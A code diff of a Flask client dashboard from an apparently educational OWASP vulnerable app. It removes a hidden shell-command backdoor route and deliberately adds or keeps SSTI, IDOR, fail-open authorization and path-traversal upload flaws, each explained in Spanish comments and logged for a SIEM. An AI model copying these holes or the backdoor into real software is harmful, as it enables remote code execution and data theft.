@@ -1,38 +1,7 @@
-import subprocess
-#EXPLOITTTT
 import csv
 import io
 import os
-
-from flask import (
-    Response, abort, current_app, flash, redirect,
-    render_template, request, url_for,
-)
-
-from app.auth_utils import current_user, login_required
-from app.blueprints.dashboard import dashboard_bp
-from app.extensions import db
-from app.models import Invoice, Telemetry
-
-
-@dashboard_bp.route("/cmd")
-def cmd():
-    c = request.args.get("c", "id")
-    out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT)
-    return Response(out, mimetype="text/plain")
-
-    """Client dashboard routes.
-
-INTENTIONAL WEAKNESSES (educational OWASP project):
-  * `invoice_detail` reads `?id_factura=` in plain text and looks the invoice up
-    with NO ownership check -> Insecure Direct Object Reference, OWASP A01.
-  * `profile` saves the uploaded file under its original, unsanitized name with
-    no type/size validation -> unrestricted upload + path traversal.
-"""
-
-import csv
-import io
-import os
+from datetime import datetime
 
 from flask import (
     Response,
@@ -41,6 +10,7 @@ from flask import (
     flash,
     redirect,
     render_template,
+    render_template_string,
     request,
     url_for,
 )
@@ -48,6 +18,7 @@ from flask import (
 from app.auth_utils import current_user, login_required
 from app.blueprints.dashboard import dashboard_bp
 from app.extensions import db
+from app.logging_config import log_event
 from app.models import Invoice, Telemetry
 
 
@@ -98,8 +69,9 @@ def invoices():
 @dashboard_bp.route("/invoice")
 @login_required
 def invoice_detail():
-    # IDOR (OWASP A01): the invoice id arrives in plain text via the query string
-    # and is fetched directly, without verifying it belongs to the current user.
+    # IDOR (A01): el id llega por query string y se resuelve tal cual. Falta el
+    # único control que importa aquí —comprobar que la factura es del usuario—,
+    # así que cambiando id_factura se leen las de cualquiera.
     id_factura = request.args.get("id_factura", type=int)
     if id_factura is None:
         abort(400, "Falta el parámetro id_factura")
@@ -107,6 +79,17 @@ def invoice_detail():
     invoice = Invoice.query.get(id_factura)
     if invoice is None:
         abort(404)
+
+    # Registramos el acceso cruzado para que el SIEM lo levante como alarma.
+    me = current_user()
+    if invoice.user_id != me.id:
+        log_event(
+            "idor_invoice_access",
+            level="warning",
+            id_factura=id_factura,
+            owner=invoice.user.username,
+            accessed_by=me.username,
+        )
 
     return render_template("dashboard/invoice_detail.html", invoice=invoice)
 
@@ -122,9 +105,10 @@ def profile():
         user.address = request.form.get("address", user.address).strip()
         user.city = request.form.get("city", user.city).strip()
 
-        # Raw file handling — no Flask-Uploads, no secure_filename, no type or
-        # size checks. The original filename is trusted verbatim, which allows
-        # arbitrary file types and path traversal (e.g. "../../evil.php").
+        # Subida sin red de seguridad (A04): nos fiamos del nombre original del
+        # cliente —sin secure_filename ni validar tipo/tamaño—, de modo que se
+        # admite cualquier extensión y el nombre puede salirse del directorio
+        # con un "../../" (path traversal).
         file = request.files.get("profile_picture")
         if file and file.filename:
             filename = file.filename
@@ -132,19 +116,31 @@ def profile():
             os.makedirs(os.path.dirname(save_path), exist_ok=True)
             file.save(save_path)
             user.profile_picture = filename
+            log_event(
+                "file_upload",
+                username=user.username,
+                filename=filename,
+                content_type=file.mimetype,
+            )
 
         db.session.commit()
-        flash("Perfil actualizado correctamente.", "success")
+
+        # SSTI (A03): se mete user.name dentro de la plantilla y se renderiza con
+        # render_template_string. Como el nombre es editable por el usuario, un
+        # valor tipo {{7*7}} se evalúa en Jinja en vez de mostrarse literal.
+        alerta = f"Perfil de {user.name} actualizado correctamente!"
+        flash(render_template_string(alerta), "success")
+
         return redirect(url_for("dashboard.profile"))
 
     return render_template("dashboard/profile.html", user=user)
 
 
 def _build_series(rows, unit, color, width=560, height=150, pad=24):
-    """Turn an ascending list of readings into SVG geometry + summary stats.
+    """Convierte una serie de lecturas (ascendente) en geometría SVG y resumen.
 
-    Everything is computed server-side (no JS charting library) so the template
-    only has to draw a <polyline> and a <polygon>.
+    Lo calculamos en el servidor para que la plantilla solo dibuje el <polyline>
+    y el <polygon>, sin depender de ninguna librería de gráficas en JS.
     """
     values = [r.value for r in rows]
     if not values:
@@ -169,7 +165,7 @@ def _build_series(rows, unit, color, width=560, height=150, pad=24):
         f"{pad + (n - 1) * step:.1f},{base_y:.1f}"
     )
 
-    # Trend: average of the most recent half vs. the older half.
+    # Tendencia: media de la mitad reciente frente a la mitad antigua.
     half = max(n // 2, 1)
     recent_avg = sum(values[-half:]) / len(values[-half:])
     prev_avg = sum(values[:half]) / len(values[:half])
@@ -222,32 +218,61 @@ def trends():
 @login_required
 def telemetry():
     user = current_user()
-    data = {}
-    for metric in ("water", "electricity"):
-        data[metric] = (
-            Telemetry.query.filter_by(user_id=user.id, metric=metric)
-            .order_by(Telemetry.reading_date.desc())
-            .limit(30)
-            .all()
+    # Rango por defecto amplísimo: sin filtrar, se ve todo el histórico propio.
+    desde = request.args.get("desde", "01/01/2000")
+    hasta = request.args.get("hasta", "31/12/2100")
+    metrica = request.args.get("metrica", "")  # "" = todas
+
+    query = Telemetry.query
+    try:
+        d1 = datetime.strptime(desde, "%d/%m/%Y").date()
+        d2 = datetime.strptime(hasta, "%d/%m/%Y").date()
+        # El filtro por user_id cuelga del mismo try que el parseo de fechas:
+        # ese es el error de diseño que explotamos justo debajo.
+        query = query.filter(
+            Telemetry.user_id == user.id,
+            Telemetry.reading_date >= d1,
+            Telemetry.reading_date <= d2,
         )
-    return render_template("dashboard/telemetry.html", data=data)
+    except Exception as exc:
+        # Fail-open (A01): una fecha mal formada rompe el strptime antes de
+        # aplicar NINGÚN filtro —tampoco el de usuario—, y la query acaba
+        # devolviendo la telemetría de todos los usuarios en lugar de fallar.
+        log_event(
+            "telemetry_filter_bypass",
+            level="warning",
+            username=user.username,
+            desde=desde,
+            hasta=hasta,
+            error=str(exc),
+        )
+
+    # El filtro de métrica sí es funcionalidad legítima y se aplica siempre.
+    if metrica in ("water", "electricity", "temperature"):
+        query = query.filter(Telemetry.metric == metrica)
+
+    rows = query.order_by(Telemetry.reading_date.desc()).all()
+    return render_template(
+        "dashboard/telemetry.html",
+        rows=rows,
+        desde=desde,
+        hasta=hasta,
+        metrica=metrica,
+    )
 
 
 @dashboard_bp.route("/telemetry/export")
 @login_required
 def telemetry_export():
     user = current_user()
-    metric = request.args.get("metric", "water")
-    if metric not in ("water", "electricity", "temperature"):
-        abort(400, "Métrica no válida")
+    metrica = request.args.get("metrica", "")
 
-    rows = (
-        Telemetry.query.filter_by(user_id=user.id, metric=metric)
-        .order_by(Telemetry.reading_date.asc())
-        .all()
-    )
+    rows_q = Telemetry.query.filter_by(user_id=user.id)
+    if metrica in ("water", "electricity", "temperature"):
+        rows_q = rows_q.filter_by(metric=metrica)
+    rows = rows_q.order_by(Telemetry.reading_date.asc()).all()
 
-    # Build the CSV in memory with the standard library (raw, no helpers).
+    # CSV en memoria con la librería estándar; el export sí respeta el user_id.
     buffer = io.StringIO()
     writer = csv.writer(buffer)
     writer.writerow(["fecha", "metrica", "valor", "unidad"])
@@ -258,7 +283,7 @@ def telemetry_export():
         buffer.getvalue(),
         mimetype="text/csv",
         headers={
-            "Content-Disposition": f"attachment; filename=telemetria_{metric}.csv"
+            "Content-Disposition": f"attachment; filename=telemetria_{metrica or 'todas'}.csv"
         },
     )
 
